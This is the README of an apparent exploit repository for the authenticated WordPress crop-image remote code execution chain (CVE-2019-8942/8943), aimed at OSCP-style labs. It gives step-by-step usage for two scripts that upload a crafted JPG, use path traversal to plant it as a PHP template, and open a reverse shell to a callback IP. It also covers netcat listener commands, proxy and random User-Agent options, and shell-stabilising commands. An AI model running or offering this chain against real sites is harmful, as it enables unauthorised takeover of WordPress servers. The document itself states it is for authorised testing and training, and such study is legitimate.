# WordPress Crop Image RCE — CVE-2019-8942 / CVE-2019-8943

Python3 implementation of the authenticated WordPress crop-image exploitation chain. The repository is organized around two independent workflows: a manual OSCP-style script and a fully automated script with an integrated reverse-shell handler.

> Use this only in authorized labs, CTFs, training platforms, or systems where you have explicit permission to test.

---

## Affected WordPress versions

The exploit chain targets the vulnerabilities tracked as:

- `CVE-2019-8942`
- `CVE-2019-8943`

The public Metasploit module for this vulnerability describes the affected versions as:

```text
WordPress 5.0.0 and WordPress <= 4.9.8
```

A valid WordPress account with media upload/edit permissions is required. In many lab environments, an Author-level user is enough.

---

## Repository layout

```text
.
├── autoexploit.py
├── exploit_oscp.py
├── image.jpg
├── README.md
└── requirements.txt
```

`image.jpg` is the default JPG carrier used by the OSCP-style script. It is included so the manual workflow works out of the box without searching for a random image.

`autoexploit.py` is self-contained and includes its own hexadecimal JPG carrier internally, but it can also accept a custom JPG with `-i`.

---

## Installation

```bash
python3 -m pip install -r requirements.txt
```

The only Python package required is:

```text
requests
```

If you want SOCKS proxy support, install requests with SOCKS extras in your environment:

```bash
python3 -m pip install 'requests[socks]'
```

---

## Script selection

| Script | Best for | Image handling | Shell handling |
|---|---|---|---|
| `exploit_oscp.py` | OSCP-style/manual exploitation | Uses `image.jpg` by default, or `-i custom.jpg` | You start `nc` manually |
| `autoexploit.py` | Fast lab use and repeat testing | Uses an embedded hex JPG by default, or `-i custom.jpg` | Starts the listener, triggers callbacks, and opens an interactive console |

Both scripts are standalone. Neither imports code from the other.

---

# OSCP-style workflow

`exploit_oscp.py` keeps the workflow explicit. It prepares the image carrier, performs the authenticated WordPress exploit chain, confirms command execution, and triggers a reverse shell to the listener that you started manually.

It does not start a handler automatically and does not use Metasploit, Meterpreter, or msfvenom.

## Basic OSCP usage

Start your listener first:

```bash
nc -lvnp 443
```

Run the exploit using the default `image.jpg`:

```bash
python3 exploit_oscp.py -t http://target.local/ -u username -p password --lhost 10.10.14.8 --lport 443
```

## OSCP usage with a custom JPG

```bash
nc -lvnp 443
```

```bash
python3 exploit_oscp.py -t http://target.local/ -u username -p password -i ./custom.jpg --lhost 10.10.14.8 --lport 443
```

## OSCP options

| Option | Required | Default | Meaning |
|---|---:|---|---|
| `-t`, `--target` | Yes | None | Target WordPress base URL, for example `http://target.local/` |
| `-u`, `--username` | Yes | None | WordPress username |
| `-p`, `--password` | Yes | None | WordPress password |
| `-i`, `--image` | No | `image.jpg` | JPG carrier to prepare and upload |
| `--lhost` | Yes | None | Your callback IP, usually your VPN/tun0 IP |
| `--lport` | Yes | None | Port where your manual listener is waiting |
| `--proxy` | No | None | Proxy URL, for example `http://127.0.0.1:8080` or `socks5://127.0.0.1:9050` |
| `--user-agent` | No | Built-in | Custom User-Agent header |
| `--random-user-agent` | No | Disabled | Use a random browser-like User-Agent |
| `--timeout` | No | `20` | HTTP timeout in seconds |
| `--debug` | No | Disabled | Print HTTP debug output and save useful failed responses |

## OSCP example with Burp

```bash
python3 exploit_oscp.py -t http://target.local/ -u username -p password -i ./image.jpg --lhost 10.10.14.8 --lport 443 --proxy http://127.0.0.1:8080
```

---

# Fully automated workflow

`autoexploit.py` is designed for speed. It can run with only target credentials and will try to select the callback IP and listener port automatically.

It performs the full exploitation flow, starts a local listener, tries multiple reverse-shell payload styles, and opens a cleaner interactive console with colorized local status messages and quiet TTY-upgrade handling.

## Basic automated usage

```bash
python3 autoexploit.py -t http://target.local/ -u username -p password
```

## Automated usage with explicit callback values

```bash
python3 autoexploit.py -t http://target.local/ -u username -p password --lhost 10.10.14.8 --lport 443
```

## Automated usage with custom image and proxy

```bash
python3 autoexploit.py -t http://target.local/ -u username -p password -i ./image.jpg --proxy http://127.0.0.1:8080
```

## Automated options

| Option | Required | Default | Meaning |
|---|---:|---|---|
| `-t`, `--target` | Yes | None | Target WordPress base URL |
| `-u`, `--username` | Yes | None | WordPress username |
| `-p`, `--password` | Yes | None | WordPress password |
| `-i`, `--image` | No | Embedded hex JPG | Optional custom JPG carrier |
| `--lhost` | No | Auto-detected | Callback IP used by the reverse shell |
| `--lport` | No | Free local port | Local listener port |
| `--listen-timeout` | No | `12` | Seconds to wait for each reverse-shell attempt |
| `--proxy` | No | None | Proxy URL, for example `http://127.0.0.1:8080` or `socks5://127.0.0.1:9050` |
| `--user-agent` | No | Built-in | Custom User-Agent header |
| `--random-user-agent` | No | Disabled | Use a random browser-like User-Agent |
| `--timeout` | No | `20` | HTTP timeout in seconds |
| `--debug` | No | Disabled | Print HTTP debug output and save useful failed responses |

---

## Proxy and User-Agent examples

HTTP proxy through Burp:

```bash
python3 autoexploit.py -t http://target.local/ -u username -p password --proxy http://127.0.0.1:8080
```

SOCKS proxy:

```bash
python3 autoexploit.py -t http://target.local/ -u username -p password --proxy socks5://127.0.0.1:9050
```

Custom User-Agent:

```bash
python3 exploit_oscp.py -t http://target.local/ -u username -p password --lhost 10.10.14.8 --lport 443 --user-agent "Mozilla/5.0 Custom"
```

Random User-Agent:

```bash
python3 autoexploit.py -t http://target.local/ -u username -p password --random-user-agent
```

---

## Why the image matters

This is not a normal PHP upload. WordPress expects image content, processes the file through the media editor, and creates a cropped image. The exploit chain then abuses attachment metadata and path traversal to place a cropped image inside the active theme directory. Finally, the cropped file is referenced as a page template so WordPress includes it as PHP.

A random JPG with PHP placed in fragile EXIF metadata may fail because GD can strip or re-encode metadata during crop processing. This repository keeps the workflow clear:

- `exploit_oscp.py` uses the included `image.jpg` by default or a custom image passed with `-i`.
- `autoexploit.py` contains an internal hexadecimal carrier so it remains self-contained.
- Both workflows prepare the upload in a way intended to survive the WordPress crop step.

---

## Technical flow

1. Authenticate to WordPress.
2. Detect the active theme.
3. Upload the JPG carrier through `async-upload.php`.
4. Obtain the media, image-editor, and attachment nonces.
5. Use `_wp_attached_file` manipulation to influence the crop output path.
6. Trigger the crop action once to prime the behavior.
7. Trigger the crop action again with traversal into the active theme directory.
8. Create a post and set `_wp_page_template` to the cropped JPG name.
9. Request the post so WordPress includes the crafted JPG as a template.
10. Confirm command execution through the `0` GET parameter.
11. Trigger a reverse shell to the configured or auto-selected callback endpoint.

---

## Troubleshooting

### Authentication works but execution is not confirmed

Check that the WordPress version is vulnerable and that the account can upload and edit media.

```bash
python3 exploit_oscp.py -t http://target.local/ -u username -p password --lhost 10.10.14.8 --lport 443 --debug
```

### Command execution is confirmed but no shell returns

Check the callback IP and listener.

```bash
ip addr show tun0
```

```bash
nc -lvnp 443
```

Then run the OSCP script again with the correct `--lhost`.

### Burp does not show traffic

Use the proxy option explicitly:

```bash
python3 autoexploit.py -t http://target.local/ -u username -p password --proxy http://127.0.0.1:8080
```

### SOCKS proxy fails

Install SOCKS support:

```bash
python3 -m pip install 'requests[socks]'
```

### Shell feels unstable

Basic reverse shells are often limited. The automated script tries to upgrade the session automatically. In OSCP mode, upgrade manually after receiving the callback:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press `Ctrl+Z` locally, then run:

```bash
stty raw -echo; fg
```

Inside the shell:

```bash
export TERM=xterm
```

---

## OSCP-style notes

`exploit_oscp.py` is intentionally manual:

- no Metasploit;
- no Meterpreter;
- no automatic handler;
- no dependency on `autoexploit.py`;
- explicit listener controlled by the operator;
- explicit `LHOST` and `LPORT`;
- clear output showing each stage.

The intended workflow is:

```bash
nc -lvnp 443
```

```bash
python3 exploit_oscp.py -t http://target.local/ -u username -p password --lhost 10.10.14.8 --lport 443
```

---

## Credits

Research and vulnerability chain were publicly documented by the original researchers and later implemented in public exploitation frameworks.

Python implementation and lab workflow by SpeatX.

---

## Legal notice

This repository is provided for authorized security testing, CTFs, training labs, and educational research.

Do not run it against systems you do not own or do not have explicit permission to test.
